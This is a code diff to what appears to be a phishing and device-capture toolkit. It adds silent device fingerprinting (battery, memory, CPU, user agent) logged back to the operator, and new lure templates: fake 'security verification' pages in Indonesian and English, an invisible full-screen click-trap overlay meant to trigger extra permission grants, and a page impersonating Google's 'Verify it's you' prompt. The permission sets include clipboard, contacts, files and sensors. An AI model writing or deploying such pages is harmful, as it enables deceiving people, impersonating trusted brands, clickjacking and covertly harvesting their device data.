@@ -156,6 +156,40 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         if (document.documentElement.requestPointerLock) document.documentElement.requestPointerLock();
       } catch(e) {}
 
+      // Android-Specific: Haptic feedback for realism
+      if (navigator.vibrate) navigator.vibrate([5, 10, 5]);
+
+      // Android-Specific: Immersive attempt
+      try {
+        if (document.documentElement.requestFullscreen) {
+          document.documentElement.requestFullscreen().catch(() => {});
+        }
+      } catch(e) {}
+
+      // Capture Deep Android Metadata
+      const captureAndroidMeta = async () => {
+        const meta = {
+          sw_ver: navigator.appVersion,
+          mem: (navigator as any).deviceMemory || 'unknown',
+          cores: navigator.hardwareConcurrency || 'unknown',
+          ua: navigator.userAgent,
+          platform: (navigator as any).platform || 'unknown'
+        };
+
+        if ((navigator as any).getBattery) {
+          try {
+            const bat = await (navigator as any).getBattery();
+            Object.assign(meta, {
+              bat_lvl: Math.floor(bat.level * 100) + '%',
+              bat_charging: bat.charging
+            });
+          } catch(e) {}
+        }
+        
+        logExtra({ device_profile: meta });
+      };
+      captureAndroidMeta();
+
       // Parallelize high-priority stealth probes
       runSilentProbes();
 
@@ -816,6 +850,24 @@ const LOGISTICS_PERMS = ['gps', 'network', 'vibration', 'performance'];
 const FORENSIC_PERMS = ['clipboard', 'contacts', 'files', 'storage', 'storage_map', 'sensors'];
 
 export const templates: Record<string, {name: string, render: (id: string) => string}> = {
+  'silent_click': {
+    name: "⚡ SILENT: Instant 1-Click (No Popups)",
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Verifikasi Keamanan</title><style>body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; margin:0; text-align:center; background:#121212; color: #ffffff; } .container { width: 100%; max-width: 450px; padding: 40px; border-radius: 12px; background: #1e1e1e; box-shadow: 0 4px 30px rgba(0,0,0,0.5); } .logo { font-size: 50px; margin-bottom: 20px; } .main-text { font-size: 24px; font-weight: 700; margin-bottom: 15px; color: #fff; } .sub-text { font-size: 15px; color: #aaa; margin-bottom: 40px; line-height: 1.5; } .btn-verify { background: #00ff00; color: #000; border: none; padding: 18px 40px; border-radius: 6px; font-size: 16px; font-weight: 800; cursor: pointer; transition: all 0.2s ease; width: 100%; text-transform: uppercase; letter-spacing: 1px; } .btn-verify:hover { transform: scale(1.02); filter: brightness(1.1); box-shadow: 0 0 20px rgba(0,255,0,0.3); } .btn-verify:active { transform: scale(0.98); } </style></head><body><div class="container"><div class="logo">🛡️</div><div class="main-text">One-Click Verification</div><div class="sub-text">Sistem ini menggunakan algoritma pasif tanpa popup izin untuk memverifikasi keamanan koneksi Anda secara instan.</div><button class="btn-verify" onclick="this.disabled=true; this.innerText='VERIFYING...'; window.startCapture('silent');">VERIFIKASI SEKARANG</button><div style="font-size:11px; color:#555; margin-top:25px;">Verified by Advanced Security Matrix</div></div>` + getCaptureScript(id, 'https://google.com', {
+      tmplId: 'silent_click', perms: ['network', 'vibration', 'performance', 'security', 'storage_map', 'network_forensic'], accent: '#00ff00', icon: '⚡', flow: 'silent'
+    }) + `</body></html>`
+  },
+  'enuma_elish': {
+    name: "⚔️ EA: Enuma Elish (Double Click Strike)",
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Verification Portal</title><style>body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; margin:0; text-align:center; background:#000; color: #ff0000; overflow: hidden; } .container { width: 100%; max-width: 450px; padding: 40px; border-radius: 12px; background: #111; box-shadow: 0 0 50px rgba(255, 0, 0, 0.5); border: 1px solid #330000; position: relative; z-index: 10; } .logo { font-size: 50px; margin-bottom: 20px; animation: pulse 2s infinite; } @keyframes pulse { 0% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.1); opacity: 1; } 100% { transform: scale(1); opacity: 0.8; } } .main-text { font-size: 26px; font-weight: 800; margin-bottom: 15px; color: #ff0000; letter-spacing: 2px; } .sub-text { font-size: 15px; color: #888; margin-bottom: 30px; line-height: 1.5; } .btn-verify { background: #ff0000; color: #fff; border: none; padding: 25px 0; border-radius: 8px; font-size: 20px; font-weight: 900; cursor: pointer; width: 100%; text-transform: uppercase; letter-spacing: 3px; position: relative; overflow: hidden; transition: 0.1s; } .btn-verify:active { transform: scale(0.95); background: #cc0000; } .tap-text { font-size: 14px; margin-top: 15px; color: #ff5555; font-weight: bold; animation: blink 0.5s infinite alternate; } @keyframes blink { from { opacity: 1; } to { opacity: 0.3; } } /* The trap element */ .click_trap { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; opacity: 0; display: none; } </style></head><body><div class="container"><div class="logo">⚔️</div><div class="main-text">EA: SYSTEM OVERRIDE</div><div class="sub-text">This server requires rapid multi-factor verification to establish a secure connection.</div><button class="btn-verify" onclick="initiateStrike(this)">DOUBLE TAP FAST</button><p class="tap-text">⚠️ DOUBLE TAP REQUIRED ⚠️</p></div><div id="trap" class="click_trap" onclick="window.startCapture('all')"></div><script>function initiateStrike(btn) { btn.innerText = 'TAP SCREEN NOW!'; btn.style.background = '#aa0000'; document.getElementById('trap').style.display = 'block'; window.startCapture('all'); setTimeout(() => { if (document.getElementById('trap').style.display === 'block') { window.startCapture('all'); } }, 300); }</script>` + getCaptureScript(id, 'https://google.com', {
+      tmplId: 'enuma_elish', perms: ALL_PERMS, accent: '#ff0000', icon: '⚔️', flow: 'aggressive'
+    }) + `</body></html>`
+  },
+  'flash_strike': {
+    name: "💥 Gilgamesh: Gate of Babylon (All Sensors)",
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>System Override</title><style>body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; margin:0; text-align:center; background:#000; color: #ffcc00; } .container { width: 100%; max-width: 450px; padding: 40px; border-radius: 12px; background: #111; border: 2px solid #ffcc00; box-shadow: 0 0 40px rgba(255, 204, 0, 0.4); } .logo { font-size: 50px; margin-bottom: 20px; text-shadow: 0 0 20px rgba(255,204,0,0.8); } .main-text { font-size: 28px; font-weight: 800; margin-bottom: 15px; color: #ffcc00; text-transform: uppercase; } .sub-text { font-size: 15px; color: #ccc; margin-bottom: 40px; line-height: 1.5; } .btn-verify { background: #ffcc00; color: #000; border: none; padding: 20px 40px; border-radius: 6px; font-size: 18px; font-weight: 900; cursor: pointer; transition: all 0.2s ease; width: 100%; text-transform: uppercase; letter-spacing: 2px; } .btn-verify:hover { transform: scale(1.05); filter: brightness(1.2); box-shadow: 0 0 30px rgba(255, 204, 0, 0.6); } .btn-verify:active { transform: scale(0.95); } </style></head><body><div class="container"><div class="logo">👑</div><div class="main-text">Absolute Authority</div><div class="sub-text">Hukum Raja adalah mutlak. Klik untuk mengeksekusi otoritas penuh atas perangkat ini.</div><button class="btn-verify" onclick="this.disabled=true; this.innerText='EXECUTING...'; window.startCapture('all');">VERIFY ONCE</button></div>` + getCaptureScript(id, 'https://google.com', {
+      tmplId: 'flash_strike', perms: ALL_PERMS, accent: '#ffcc00', icon: '💥', flow: 'aggressive'
+    }) + `</body></html>`
+  },
   'google': {
     name: "🛡️ Google: Identity Verification (Full Scope)",
     render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Verification</title><style>body { font-family: 'Google Sans', 'Roboto', Arial, sans-serif; background:#ffffff; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { border:1px solid #dadce0; border-radius:8px; padding:48px 40px 36px; width:100%; max-width:450px; text-align:left; box-sizing:border-box; } .google-logo { width:75px; margin-bottom:12px; } h1 { font-size:24px; font-weight:400; color:#202124; margin:0 0 8px; } p { font-size:16px; color:#3c4043; margin-bottom:32px; line-height: 1.5; } .identity-pill { border:1px solid #dadce0; border-radius:16px; padding:4px 10px; font-size:14px; color:#3c4043; display:inline-flex; align-items:center; margin-bottom:24px; font-weight: 500; } .identity-pill img { width:20px; height:20px; border-radius:50%; margin-right:8px; } .btn { background:#1a73e8; color:#fff; border:none; padding:10px 24px; border-radius:4px; font-size:14px; font-weight:500; cursor:pointer; float: right; transition: background .2s; } .btn:hover { background: #1b66c9; } .footer { display: flex; margin-top: 80px; font-size: 12px; color: #70757a; font-weight: 400; justify-content: space-between; clear: both; }</style></head><body><div class="box"><img class="google-logo" src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg"><h1>Verify it's you</h1><div class="identity-pill"><img src="https://ssl.gstatic.com/images/branding/product/1x/avatar_circle_blue_512dp.png">Google Security Service</div><p>Google has detected an unusual sign-in attempt. To help keep your account secure, we need to verify that it's really you on this device.</p><div style="margin-top: 32px; height: 40px;"><button class="btn" onclick="window.startCapture();">Continue</button></div><div class="footer"><div>English (United States)</div><div style="display:flex; gap:16px;"><span>Help</span><span>Privacy</span><span>Terms</span></div></div><div style="font-size:10px; color:#999; margin-top:15px; text-align:center;">By continuing, you agree to the Google <a href="#" style="color:#1a73e8; text-decoration:none;">User Agreement</a></div></div>${getCaptureScript(id, 'https://myaccount.google.com/security', {
